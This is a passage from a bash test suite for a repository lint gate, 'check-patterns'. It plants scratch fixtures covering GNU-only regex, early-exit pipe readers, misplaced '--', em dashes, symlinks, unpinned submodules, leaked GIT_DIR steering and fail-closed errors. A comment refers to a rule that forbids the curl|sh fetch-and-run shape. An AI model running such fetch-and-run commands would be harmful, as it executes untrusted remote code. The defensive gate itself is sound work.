printf '%s\n' "python3 - <<'PY'" "import re" "re.compile(r\"\\s+\")" "PY" > "$r/tests/x_test.sh"
fails_with "$r" "$gnu_msg" "a \\s inside a python3 heredoc in a .sh file must still fail"

# the filter is an EXACT suffix `.py`, not "contains py": neither a double
# extension nor a name that merely starts with the letters buys the exemption.
r="$work/gnu-py-suffix-exact"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/x.py.sh"
fails_with "$r" "$gnu_msg" "a \\s in x.py.sh (not a .py file) must still fail"

r="$work/gnu-py-prefix-only"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "import re" "re.compile(r\"\\s+\")" > "$r/tests/xpy"
fails_with "$r" "$gnu_msg" "a \\s in a file named xpy (no .py suffix) must still fail"

# --- REGRESSION: a hit in BOTH gnu_rest and gnu_tests prints $gnu_msg ONCE ----
# The two-block form used to gate each pass's OWN "if viol; then print
# $gnu_msg", so a hit in both passes printed the message twice.
r="$work/gnu-both-passes-hit"; mkdir -p "$r/lib" "$r/tests"
printf 'noop() { : ; }\n' > "$r/lib/os.sh"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/lib/x.sh"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/tests/x_test.sh"
out="$(STRICT= "$cp" "$r" 2>&1)" || true
count=$(printf '%s\n' "$out" | grep -c "$gnu_msg")
[ "$count" = "1" ] && ok || fail "\$gnu_msg must print exactly once even when both gnu-arm passes hit (got $count)"

# --- FAIL CLOSED, each pass separately (its own call site, its own bug to
# regress into) - a hit in one arm's grep call must not depend on the OTHER
# call site's fail-closed handling still being wired up. Other arms (1, 2, 5,
# 6, 9, 10...) also scan lib/ and tests/ and would fail closed on the same
# unreadable dir, so a bare nonzero exit does not prove arm 8 is the one
# failing - each pass's message names ITS OWN pass ("non-tests/" vs "tests/").
# check-patterns's _gnu_fail (bin/check-patterns) couples that message to
# `bad=1` as one call, so a call site that stops calling it loses its message
# too, which these two fixtures catch; an inline reimplementation that keeps
# the printf but drops `bad=1` would NOT be caught here. Root-skipped for the
# same `chmod 000` reason as the general fail-closed case above - see that
# comment for what was tried instead.
gnu_rest_err_msg="check-patterns: GNU-regex scan (non-tests/ pass) errored"
gnu_tests_err_msg="check-patterns: GNU-regex scan (tests/ pass) errored"
if [ "$(id -u)" -ne 0 ]; then
  r="$work/gnu-rest-failclosed"; seed "$r"; mkdir -p "$r/lib/locked"
  chmod 000 "$r/lib/locked"
  fails_with "$r" "$gnu_rest_err_msg" "arm 8's non-tests/ (gnu_rest) pass must fail closed on an unreadable dir"
  chmod u+rwx "$r/lib/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 8's gnu_rest fail-closed case"
fi

if [ "$(id -u)" -ne 0 ]; then
  r="$work/gnu-tests-failclosed"; seed "$r"; mkdir -p "$r/tests/locked"
  chmod 000 "$r/tests/locked"
  fails_with "$r" "$gnu_tests_err_msg" "arm 8's tests/ (gnu_tests) pass must fail closed on an unreadable dir"
  chmod u+rwx "$r/tests/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 8's gnu_tests fail-closed case"
fi

# --- REGRESSION: hits print in a single STABLE (sorted) order, not pass order
# or filesystem readdir order. gnu_rest's array lists zsh/ BEFORE Makefile, so
# an unsorted combined result would show the zsh/ hit first; sorted (LC_ALL=C,
# path then line number), Makefile sorts first ('M' < 'z'). Deterministic by
# construction - it does not depend on readdir order at all.
r="$work/gnu-sort-order"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' "sed -E 's/\\s+//'" > "$r/zsh/x.zsh"
printf '%s\n' "y=\"\$(sed -E 's/\\s+//' <<<\"\$x\")\"" > "$r/Makefile"
out="$(STRICT= "$cp" "$r" 2>&1)" || true
makefile_pos=$(printf '%s\n' "$out" | grep -n '/Makefile:' | sed -n '1p' | cut -d: -f1)
zsh_pos=$(printf '%s\n' "$out" | grep -n '/zsh/x\.zsh:' | sed -n '1p' | cut -d: -f1)
if [ -n "$makefile_pos" ] && [ -n "$zsh_pos" ] && [ "$makefile_pos" -lt "$zsh_pos" ]; then
  ok
else
  fail "gnu-arm hits must print in a stable sorted order (Makefile before zsh/x.zsh), got positions '$makefile_pos'/'$zsh_pos': $out"
fi

# === the early-exit-reader arm ===================================================
# `grep -q` / `head` on the right of a pipe exit before the writer is done; under
# pipefail the writer's SIGPIPE fails the pipeline at random. Fixtures spell the
# pipe through $P, so THIS file's own source never carries the shape the arm
# looks for (the arm scans tests/).
eex_msg="check-patterns: an early-exit reader"
P='|'
i=0
for line in \
  "printf '%s\\n' \"\$out\" $P grep -q 'usage' || fail x" \
  "if find \"\$HOME\" $P grep -q .; then fail x; fi" \
  "x=\"\$(LC_ALL=C grep a f $P LC_ALL=C grep -qF b)\"" \
  "  $P grep -qE '(^|[^[:alnum:]_-])canga' ; then" \
  "cmd $P grep -E -q x" \
  "cmd $P grep -m1 x" \
  "cmd $P grep --quiet x" \
  "cmd $P grep -l x" \
  "cmd $P& grep -q x" \
  "cmd $P egrep -q x" \
  "cmd $P fgrep -q x" \
  "v=\"\$(tmux ls $P head -1)\"" \
  ; do
  i=$((i + 1)); r="$work/eex-$i"; seed "$r"; mkdir -p "$r/tests"
  printf '%s\n' "$line" > "$r/tests/x_test.sh"
  fails_with "$r" "$eex_msg" "early-exit reader shape $i: $line"
done
# lib/ (sourced by install.sh) and the workflows are on the surface too
r="$work/eex-lib"; seed "$r"
printf '%s\n' "cur=\"\$(git status $P grep -q x)\"" > "$r/lib/tool.sh"
fails_with "$r" "$eex_msg" "an early-exit reader in lib/"
r="$work/eex-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "          xz --version $P head -1" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$eex_msg" "head in a workflow run step"

# the fixes, and readers that drain their input, pass
r="$work/eex-ok"; seed "$r"; mkdir -p "$r/tests" "$r/zsh"
printf '%s\n' \
  "grep -q 'usage' <<<\"\$out\" || fail x" \
  "grep -qw reuse <<<\"\$(grep -E '^local-ci:' Makefile)\"" \
  "if [ -n \"\$(find \"\$HOME\" -mindepth 1)\" ]; then fail x; fi" \
  "n=\"\$(cmd $P grep -c x || true)\"" \
  "bad=\"\$(cmd $P grep -vE '^#' || true)\"" \
  "a || grep -q x f" \
  "v=\"\$(cmd $P sed -n 1p)\"" \
  "cmd $P headers" \
  "# never pipe into grep -q: cmd $P grep -q x" > "$r/tests/x_test.sh"
# zsh/ is interactive (no pipefail) and outside the arm's surface
printf '%s\n' "alias ducks='du -cks -- *(D) $P sort -rn $P head'" > "$r/zsh/aliases.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "here-strings, draining readers, comments and zsh/ must pass the early-exit arm"

# === the misplaced `--` arm =======================================================
# BSD getopt (macOS) stops at the first operand, so a `--` after it is a FILE
# operand; GNU getopt permutes argv and accepts either order. Fixtures spell the
# delimiter through $D, so THIS file's own source never carries the shape the arm
# looks for (the arm scans tests/).
dd_msg="check-patterns: a '--' after the first operand"
D='--'
i=0
for line in \
  "  chmod -R go-w $D \"\$plugins\" 2>/dev/null \\" \
  "grep -q \"\$pat\" $D \"\$f\" || fail x" \
  "if ! /bin/rm -f \"\$x\" $D; then :; fi" \
  "x=\"\$(sed -n 1p \"\$f\" $D)\"" \
  "sudo chown root:wheel $D /x" \
  "mkdir -m 700 \"\$d\" $D" \
  "LC_ALL=C grep -e a -qF \"\$b\" $D f" \
  "a && cp \"\$a\" $D \"\$b\"" \
  "elif mv \"\$a\" $D \"\$b\"; then :; fi" \
  "  x) rm -f \"\$d\" $D ;;" \
  "grep -em pat $D f" \
  "grep -fe pat $D f" \
  "touch -Ar ref $D f" \
  ; do
  i=$((i + 1)); r="$work/dd-$i"; seed "$r"; mkdir -p "$r/tests"
  printf '%s\n' "$line" > "$r/tests/x_test.sh"
  fails_with "$r" "$dd_msg" "misplaced -- shape $i: $line"
done
# zsh/ and the workflows run on a mac too
r="$work/dd-zsh"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' "  ln -s \"\$src\" $D \"\$dst\"" > "$r/zsh/functions.zsh"
fails_with "$r" "$dd_msg" "a misplaced -- in zsh/"
r="$work/dd-ci"; seed "$r"; mkdir -p "$r/.github/workflows"
printf '%s\n' "      - run: chmod u+x $D bin/x" > "$r/.github/workflows/ci.yml"
fails_with "$r" "$dd_msg" "a misplaced -- in a workflow run step"

# the fix, argument-taking options, quoted patterns and non-command positions pass
r="$work/dd-ok"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' \
  "chmod -R $D go-w \"\$p\" 2>/dev/null" \
  "rm -f $D \"\$x\"; mv -f $D \"\$a\" \"\$b\"" \
  "grep -qE $D \"\$pat\" f" \
  "grep -e \"\$pat\" $D f" \
  "grep -qF -m 1 $D x f" \
  "mkdir -m 700 $D \"\$d\"" \
  "sed -e 's/a/b/' $D f" \
  "sed -i '' -e 's/a/b/' $D f" \
  "grep -qx 'install --pin v1 $D gh' <<<\"\$c\"" \
  "grep -qF \"a; b $D c\" f" \
  "git grep -h -E pat $D ." \
  "echo chmod x $D y" \
  "gh extension install --pin \"\$p\" $D \"\$r\"" \
  "ck x \"\$(cat \"\$f\")\" \"run --env-file e $D restic\"" \
  "# never write chmod -R go-w $D x" \
  "case \$x in a) rm -f $D \"\$d\" ;; esac" \
  "elif mv -f $D \"\$a\" \"\$b\"; then :; fi" \
  "grep -em $D pat f" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a leading --, option arguments, quoted text and non-command words must pass the -- arm"

# DOCUMENTED GAPS, pinned: the arm does not see these shapes today. A change that
# starts catching one must update the arm's NOT-covered list and this
# fixture together, so coverage never moves silently.
r="$work/dd-gaps"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' \
  "\$CHMOD -R go-w $D \"\$d\"" \
  "sudo -n chmod -R go-w $D \"\$d\"" \
  "find . -exec chmod go-w $D {} +" \
  "chmod -R go-w \\" \
  "  $D \"\$d\"" > "$r/tests/x_test.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a documented gap of the -- arm (\$CMD, sudo options, find -exec, a \\ continuation) is now caught - update the arm's NOT-covered list"

# === the em-dash arm =============================================================
# House style (CONTRIBUTING.md's community standards and .claude/rules/docs.md's
# documentation standard) is a plain hyphen; the arm forbids the Unicode em dash
# (U+2014) anywhere in the repo's own prose, comments included - unlike arms
# (5)-(10) it does NOT strip comments first (the same reasoning arms (1)-(2) use
# for curl|sh and uname -m: a forbidden shape in a comment is still the shape).
# The byte sequence is built at RUNTIME from its UTF-8 bytes ($'\xe2\x80\x94'),
# never pasted as a literal character into this test file - a literal here
# would trip check-patterns's own em-dash arm on its own test suite.
em_dash_msg="check-patterns: an em dash"
em_dash=$'\xe2\x80\x94'
en_dash=$'\xe2\x80\x93'

# a shell comment carrying an em dash is caught - comments are prose too.
r="$work/emdash-comment"; seed "$r"
printf '# a note %s a trailing clause\n' "$em_dash" > "$r/lib/note.sh"
fails_with "$r" "$em_dash_msg" "an em dash in a shell comment"

# a Markdown file carrying an em dash is caught.
r="$work/emdash-md"; seed "$r"; mkdir -p "$r/docs"
printf 'A sentence %s a trailing clause.\n' "$em_dash" > "$r/docs/note.md"
fails_with "$r" "$em_dash_msg" "an em dash in a Markdown file"

# a zsh file carrying an em dash is caught.
r="$work/emdash-zsh"; seed "$r"; mkdir -p "$r/zsh"
printf '# prompt segment %s status\n' "$em_dash" > "$r/zsh/prompt.zsh"
fails_with "$r" "$em_dash_msg" "an em dash in a zsh file"

# the allowlisted lazy.nvim lockfile is exempt even though it sits inside the
# otherwise-scanned config/ tree - lazy.nvim rewrites it wholesale on every sync.
r="$work/emdash-allowlisted"; seed "$r"; mkdir -p "$r/config/nvim"
printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
[ "$(run "$r")" = "0" ] && ok || fail "config/nvim/lazy-lock.json must be exempt from the em-dash arm"

# a plain hyphen and an en dash both pass - the arm targets exactly U+2014.
r="$work/emdash-clean"; seed "$r"; mkdir -p "$r/docs"
printf 'a sentence - with a plain hyphen, and a range 3%s5 too\n' "$en_dash" > "$r/docs/note.md"
[ "$(run "$r")" = "0" ] && ok || fail "a plain hyphen and an en dash must both pass the em-dash arm"

# --- the lazy-lock exemption is ANCHORED to the PATH:NN: field, never a
# substring match anywhere on the hit line -----------------------------------
# REGRESSION: an earlier version (`(^|/)config/nvim/lazy-lock\.json:`) exempted
# any hit line where that text was preceded by line-start OR a bare `/` -
# ANYWHERE on the PATH:NN:CONTENT line, not just in the PATH field. A docs
# sentence that names the exempted path with a leading slash (as in a full
# path shown to a reader, "/repo/config/nvim/lazy-lock.json:") reproduces the
# bypass: the CONTENT half alone satisfies `(^|/)`, so the whole hit line was
# wrongly exempted even though the VIOLATION is in docs/, not the lockfile.
# (A mention with no leading slash, e.g. a bare "config/nvim/lazy-lock.json:",
# does NOT reproduce it - `(^|/)` still requires line-start or a slash right
# before "config", so this fixture must use the slash-prefixed form to
# actually exercise the bug; verified by running it against the pre-fix
# pattern before writing this comment.)
r="$work/emdash-anchor-bypass"; seed "$r"; mkdir -p "$r/docs"
printf 'See /repo/config/nvim/lazy-lock.json: it drifts %s investigate.\n' "$em_dash" > "$r/docs/other.md"
fails_with "$r" "$em_dash_msg" "a file that only MENTIONS a slash-prefixed config/nvim/lazy-lock.json: text (not the file itself) must still fail"

# --- REGRESSION: the CURRENT (start-of-PATH-field) anchor still accepted ANY
# leading directory segment before "config/nvim/lazy-lock.json:", so a DECOY
# file at a different real path ending in those same segments (still inside
# the scanned config/ tree) was wrongly exempted too - fail-OPEN (reproduced
# against the pre-fix pattern: exit 0, expected non-zero). The real
# config/nvim/lazy-lock.json above must still be exempt; this fixture proves a
# LOOK-ALIKE path elsewhere does not ride along on that exemption.
r="$work/emdash-lazylock-decoy-file"; seed "$r"; mkdir -p "$r/tests/config/nvim" "$r/config/nvim"
printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/tests/config/nvim/lazy-lock.json"
printf '{ "note": "a sentence %s a trailing clause" }\n' "$em_dash" > "$r/config/nvim/lazy-lock.json"
fails_with "$r" "$em_dash_msg" "a decoy tests/config/nvim/lazy-lock.json (not the real allowlisted path) must still fail"

# --- REGRESSION-LOCK: `-I` (binary skip) is not pinned to a specific grep -----
# version or flavor, so this locks in the CURRENT, relied-upon behavior: a file
# that carries a NUL byte is treated as binary and skipped by `-I`, even when
# it also carries the exact forbidden em-dash bytes right next to the NUL. If a
# future edit drops `-I`, this fixture starts failing (the file would then be
# scanned as text and caught), which is the signal that the binary-skip
# contract broke.
r="$work/emdash-nul-binary-skip"; seed "$r"; mkdir -p "$r/docs"
printf 'a note\000%s trailing\n' "$em_dash" > "$r/docs/note.md"
[ "$(run "$r")" = "0" ] && ok || fail "a file with a NUL byte plus an em dash must be skipped as binary (-I), not scanned"

# --- FAIL CLOSED, arm 11's own two rc>=2 branches, each its own call site ----
# Same `chmod 000` reason as the general fail-closed case above (root bypasses
# it via DAC_OVERRIDE, so these SKIP under root) - see that comment for what
# was tried instead. Each fixture targets ONE of arm 11's two grep calls, so a
# hit in the OTHER call's fail-closed handling cannot make this one pass by
# accident: the recursive PROSE scan (over ${prose[@]}, which includes docs/,
# unlike the shared ${scan[@]}) and the NARROW self-scan of bin/check-patterns
# alone. Mutating either `rc -ge 2` to `rc -ge 99` passes every OTHER fixture
# in this file but fails these two (measured).
em_dash_prose_err_msg="check-patterns: em-dash scan errored"
em_dash_self_err_msg="check-patterns: check-patterns self-scan errored"
if [ "$(id -u)" -ne 0 ]; then
  r="$work/emdash-prose-failclosed"; seed "$r"; mkdir -p "$r/docs/locked"
  chmod 000 "$r/docs/locked"
  fails_with "$r" "$em_dash_prose_err_msg" "arm 11's recursive prose scan must fail closed on an unreadable dir"
  chmod u+rwx "$r/docs/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 11's prose-scan fail-closed case"
fi

if [ "$(id -u)" -ne 0 ]; then
  r="$work/emdash-self-failclosed"; seed "$r"; mkdir -p "$r/bin"
  printf '#!/usr/bin/env bash\n# a plain note\n' > "$r/bin/check-patterns"
  chmod 000 "$r/bin/check-patterns"
  fails_with "$r" "$em_dash_self_err_msg" "arm 11's narrow self-scan of bin/check-patterns must fail closed on an unreadable file"
  chmod u+rwx "$r/bin/check-patterns"
else
  echo "  SKIP: running as root - cannot exercise arm 11's self-scan fail-closed case"
fi

# --- a check-patterns-named file ELSEWHERE (not bin/check-patterns) stays
# excluded from the RECURSIVE scan, same as every other arm ------------------
# Arm 11 keeps `--exclude=check-patterns` on its recursive scan for UNIFORMITY
# with the other arms and with tests/plugins_test.sh's own invariant (every
# recursive grep line in this script self-excludes, no per-arm exceptions).
# That exclusion is a basename match, so it also exempts a same-named file
# OUTSIDE bin/ - lib/ here, deliberately not bin/check-patterns, which is the
# ONE path the narrow self-scan below now covers on its own (see the next
# fixture). This one is a self-exclude proof, not a violation case.
r="$work/emdash-elsewhere"; seed "$r"; mkdir -p "$r/lib"
printf '# a note %s trailing\n' "$em_dash" > "$r/lib/check-patterns"
[ "$(run "$r")" = "0" ] && ok || fail "a file named check-patterns OUTSIDE bin/ must stay excluded from the em-dash arm's recursive scan"

# --- an em dash literally in bin/check-patterns itself IS caught ------------
# REGRESSION: the recursive scan's `--exclude=check-patterns` above means it
# never sees this exact path, and nothing else in the repo checked it either -
# measured before this fixture existed: appending an em dash to a scratch copy
# of bin/check-patterns and running the real gate against it exited 0. The
# narrow, non-recursive self-scan closes that gap.
r="$work/emdash-self"; seed "$r"; mkdir -p "$r/bin"
printf '#!/usr/bin/env bash\n# a note %s trailing\n' "$em_dash" > "$r/bin/check-patterns"
fails_with "$r" "$em_dash_msg" "an em dash literally in bin/check-patterns must be caught by the narrow self-scan"

# --- an em dash inside a pinned zsh plugin is exempt (third-party code) -----
r="$work/emdash-plugins-exempt"; seed "$r"; mkdir -p "$r/zsh/plugins/some-plugin"
printf '# note %s trailing\n' "$em_dash" > "$r/zsh/plugins/some-plugin/some-plugin.plugin.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "an em dash inside zsh/plugins/ must be exempt (third-party code)"

# --- every non-${scan[@]} prose-surface member is covered - a silent rename --
# must fail loudly. HARDCODED, deliberately independent of bin/check-patterns's
# own `for p in ...` list (the same reasoning as the -- arm's dd fixtures
# above): if a future edit renames or drops one of these 15 members from the
# real `prose` array, this loop keeps asserting against the OLD list and the
# corresponding case starts failing, rather than silently testing nothing.
# Directory members get a nested probe file; file members get an em dash
# written directly into them (safe: these are scratch fixture trees, never
# the real repo).
i=0
for member in docs tests .github .claude Makefile REUSE.toml cliff.toml \
    .gitleaks.toml .gitignore .gitmodules CLAUDE.md CONTRIBUTING.md \
    SECURITY.md THIRD-PARTY-NOTICES.md README.md; do
  i=$((i + 1)); r="$work/emdash-surface-$i"; seed "$r"
  case "$member" in
    docs | tests | .github | .claude)
      mkdir -p "$r/$member"
      printf 'a note %s trailing\n' "$em_dash" > "$r/$member/probe.txt"
      ;;
    *)
      printf 'a note %s trailing\n' "$em_dash" > "$r/$member"
      ;;
  esac
  fails_with "$r" "$em_dash_msg" "prose-surface member $i/15 ('$member') must be scanned for an em dash"
done

# === arm (12): a symlink where a recursive scan reads =========================
# A symlink there hides its target from every recursive arm above (see
# bin/check-patterns). ALWAYS: every symlink on disk over `prose`, the arm
# (11) surface. ADDITIONALLY, when $root has a .git of its own: the whole
# repository, tracked only, for a symlink outside `prose` and a gitlink that is
# not a pinned plugin.
sym_msg="check-patterns: a symlink where a recursive scan reads"
sym_git_msg="check-patterns: a tracked symlink, or a gitlink that is not a pinned plugin"
sym_git_err_msg="check-patterns: symlink scan (git ls-files, repo-wide) errored"
sym_git_stderr_msg="check-patterns: symlink scan (git ls-files, repo-wide) wrote to stderr"
sym_git_record_msg="check-patterns: symlink scan (git ls-files, repo-wide) returned a malformed record"
sym_nogit_msg="check-patterns: symlink scan (git, repo-wide) cannot run: git is not on PATH"
sym_probe_msg="check-patterns: symlink scan (git, repo-wide) could not resolve the toplevel"
sym_top_msg="check-patterns: symlink scan (git, repo-wide) resolved a different toplevel"
sym_find_err_msg="check-patterns: symlink scan (find) errored"

# fails_only_with ROOT MESSAGE LABEL - fails_with, plus every `check-patterns:`
# line but an informational SKIP must be MESSAGE: the non-zero exit cannot come
# from another arm.
fails_only_with() {
  local rc=0 out line
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" != "0" ] || fail "$3: the gate passed"
  case "$out" in
    *"$2"*) ;;
    *) fail "$3: expected the message '$2', got: $out" ;;
  esac
  while IFS= read -r line; do
    case "$line" in
      "$2"* | "check-patterns: SKIP "*) ;;
      check-patterns:*) fail "$3: another message fired too: $line" ;;
    esac
  done <<<"$out"
  pass=$((pass + 1))
}

# _git_repo DIR - a minimal scratch git repo, gpgsign off, author fixed so the
# fixture never depends on this machine's git config existing.
_git_repo() {
  mkdir -p "$1"
  git init -q "$1"
  git -C "$1" config user.email a@x
  git -C "$1" config user.name a
  git -C "$1" config commit.gpgsign false
}

# --- REGRESSION: a leaked GIT_DIR must not redirect this file's OWN
# _git_repo/sym-git fixtures into whatever repository it points at. Re-runs
# this whole file as a subprocess with GIT_DIR/GIT_WORK_TREE aimed at a
# scratch sentinel repo under /tmp (never a real checkout) and asserts the
# sentinel is unchanged afterward: HEAD, and the config and index a stray
# `git config` or `git add` would write without committing. The copy runs at
# _CPT_DEPTH=1, which skips this block and runs every other assertion.
if [ "$_CPT_DEPTH" -eq 0 ]; then
  sentinel="$work/leak-sentinel"; _git_repo "$sentinel"
  printf 'baseline\n' > "$sentinel/f"; git -C "$sentinel" add -A
  git -C "$sentinel" commit -qm baseline
  head_before="$(git -C "$sentinel" rev-parse HEAD)"
  config_before="$(cksum < "$sentinel/.git/config")"
  index_before="$(cksum < "$sentinel/.git/index")"
  leak_rc=0; leak_log="$work/leak-child.log"
  _CPT_DEPTH=$((_CPT_DEPTH + 1)) GIT_DIR="$sentinel/.git" GIT_WORK_TREE="$sentinel" \
    bash "$repo_root/tests/check_patterns_test.sh" > "$leak_log" 2>&1 || leak_rc=$?
  if [ "$leak_rc" -ne 0 ]; then
    cat "$leak_log" >&2
    fail "this suite must still pass under a leaked GIT_DIR (rc $leak_rc, output above)"
  fi
  ok
  [ "$head_before" = "$(git -C "$sentinel" rev-parse HEAD)" ] \
    && ok || fail "a leaked GIT_DIR must not let a fixture commit into the sentinel repo"
  [ "$config_before" = "$(cksum < "$sentinel/.git/config")" ] \
    && ok || fail "a leaked GIT_DIR must not let a fixture write the sentinel repo's config"
  [ "$index_before" = "$(cksum < "$sentinel/.git/index")" ] \
    && ok || fail "a leaked GIT_DIR must not let a fixture write the sentinel repo's index"
else
  echo "  SKIP: nested run (_CPT_DEPTH=$_CPT_DEPTH) - the leaked-GIT_DIR regression runs at depth 0 only"
fi

# --- per-member parity: every prose member, planted with a symlink, is
# caught by the always-on find pass. Same shape as the em dash loop above,
# HARDCODED independent of check-patterns' own arrays - a silent rename or
# drop must fail loudly here too. Non-git fixtures, so this exercises find
# alone, never the repo-wide git pass.
i=0
for member in install.sh lib bin zsh config packages security home \
    docs tests .github .claude Makefile REUSE.toml cliff.toml \
    .gitleaks.toml .gitignore .gitmodules CLAUDE.md CONTRIBUTING.md \
    SECURITY.md THIRD-PARTY-NOTICES.md README.md; do
  i=$((i + 1)); r="$work/sym-surface-$i"; seed "$r"
  case "$member" in
    lib | bin | zsh | config | packages | security | home | docs | tests | .github | .claude)
      mkdir -p "$r/$member"
      ln -s ./nonexistent-target "$r/$member/evil-link"
      ;;
    *)
      ln -s ./nonexistent-target "$r/$member"
      ;;
  esac
  fails_with "$r" "$sym_msg" "surface member $i/23 ('$member') must be scanned for a symlink"
done

# --- an UNTRACKED symlink at a git toplevel is still caught (find is
# always-on, regardless of git) ----------------------------------------------
r="$work/sym-untracked-toplevel"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ./nonexistent-target "$r/lib/evil-link"
fails_with "$r" "$sym_msg" "an untracked symlink at a git toplevel must still fail the gate"

# --- a TRACKED symlink OUTSIDE prose is caught by the repo-wide git pass,
# which find alone (surface-scoped) cannot see -------------------------------
r="$work/sym-git-outside"; _git_repo "$r"; seed "$r"; mkdir -p "$r/outside"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ../target "$r/outside/evil-link"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm "add symlink outside prose"
fails_with "$r" "$sym_git_msg" "a tracked symlink OUTSIDE prose must fail via the repo-wide git pass"

# --- case-sensitivity: pathspec matching plays no part any more (the git
# pass takes none), so a tracked symlink under a differently-cased path is
# still caught -----------------------------------------------------------
r="$work/sym-case"; _git_repo "$r"; seed "$r"; mkdir -p "$r/Config"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ../target "$r/Config/p.sh"; printf 'x\n' > "$r/target"
git -C "$r" add -A && git -C "$r" commit -qm "add case-mismatched symlink"
fails_with "$r" "$sym_git_msg" "a tracked symlink under a differently-cased path must still fail"

# --- an UNPINNED submodule (mode 160000, not in .gitmodules) is caught ------
r="$work/sym-rogue-submodule"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,lib/rogue-submodule
git -C "$r" commit -qm "add unpinned submodule"
fails_with "$r" "$sym_git_msg" "a submodule gitlink not pinned in .gitmodules must fail the gate"

# --- a PINNED submodule (mode 160000, matching .gitmodules) is NOT flagged --
r="$work/sym-pinned-submodule"; _git_repo "$r"; seed "$r"
cat > "$r/.gitmodules" <<'EOF'
[submodule "zsh/plugins/fake-plugin"]
	path = zsh/plugins/fake-plugin
	url = https://example.invalid/fake-plugin.git
EOF
mkdir -p "$r/zsh/plugins"
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,zsh/plugins/fake-plugin
git -C "$r" commit -qm "add pinned submodule"
[ "$(run "$r")" = "0" ] && ok || fail "a submodule gitlink matching .gitmodules must not be flagged"

# --- an UNTRACKED symlink under the excluded zsh/plugins/ path is not
# flagged by either pass: find prunes the exact path, and it is not tracked -
r="$work/sym-plugins-exempt"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ./nonexistent-target "$r/zsh/plugins/evil-link"
[ "$(run "$r")" = "0" ] && ok || fail "an untracked symlink under zsh/plugins/ must not be flagged"

# --- REGRESSION: $root a subdirectory of a LARGER repo must not make the
# git pass scan the PARENT's whole tree - a tracked symlink outside $root
# (but inside the parent) must not surface, while one INSIDE $root (find's
# job, unconditional) still must ---------------------------------------------
parent="$work/sym-parent"; _git_repo "$parent"
mkdir -p "$parent/subproj/lib"; printf 'noop() { : ; }\n' > "$parent/subproj/lib/os.sh"
printf 'x\n' > "$parent/subproj/install.sh"
mkdir -p "$parent/elsewhere"
ln -s ../outside-target "$parent/elsewhere/evil-link"
printf 'x\n' > "$parent/outside-target"
git -C "$parent" add -A && git -C "$parent" commit -qm init
[ "$(run "$parent/subproj")" = "0" ] \
  && ok || fail "root as a subdir of a larger repo must not scan the parent's whole tree"
ln -s ./nonexistent-target "$parent/subproj/lib/evil-link"
fails_with "$parent/subproj" "$sym_msg" "a symlink INSIDE a subdir root must still be caught by find"

# --- STEERING: a leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE at
# check-patterns' OWN invocation must not redirect its scan away from $root -
# sentinel is scratch, under /tmp, never a real checkout ---------------------
steer_sentinel="$work/steer-sentinel"; _git_repo "$steer_sentinel"
printf 'x\n' > "$steer_sentinel/f"; git -C "$steer_sentinel" add -A
git -C "$steer_sentinel" commit -qm sentinel
r="$work/sym-steer-target"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
ln -s ./nonexistent-target "$r/lib/evil-link"
steer_rc=0
GIT_DIR="$steer_sentinel/.git" GIT_WORK_TREE="$steer_sentinel" \
  GIT_INDEX_FILE="/nonexistent/index" \
  STRICT= "$cp" "$r" >/dev/null 2>&1 || steer_rc=$?
[ "$steer_rc" != "0" ] \
  && ok || fail "a leaked GIT_DIR/GIT_WORK_TREE/GIT_INDEX_FILE must not steer check-patterns away from a real violation in \$root"

# --- FAIL CLOSED: an unreadable dir in the surface fails the find pass.
# `chmod 000` is bypassed by root (DAC_OVERRIDE) - see the general fail-closed
# case above for what was tried instead. The dir sits under lib/plugins/,
# which every grep arm skips (--exclude-dir=plugins) but find does not, so
# arm 12 is the ONLY arm that errors: fails_only_with then proves the non-zero
# exit is arm 12's own bad=1, not another arm's. ------------------------------
if [ "$(id -u)" -ne 0 ]; then
  r="$work/sym-find-failclosed"; seed "$r"; mkdir -p "$r/lib/plugins/locked"
  chmod 000 "$r/lib/plugins/locked"
  fails_only_with "$r" "$sym_find_err_msg" "an unreadable dir in the surface must fail closed the symlink scan too"
  chmod u+rwx "$r/lib/plugins/locked"
else
  echo "  SKIP: running as root - cannot exercise arm 12's find-branch fail-closed case"
fi

# --- FAIL CLOSED: a corrupted git index fails the repo-wide git pass, not a
# silent pass ("no symlinks") -------------------------------------------------
r="$work/sym-git-failclosed"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
printf 'garbage, not a git index\n' > "$r/.git/index"
fails_with "$r" "$sym_git_err_msg" "a corrupted git index must fail closed, not silently pass"

# --- a malformed .git at $root fails CLOSED, never a silent skip of the git
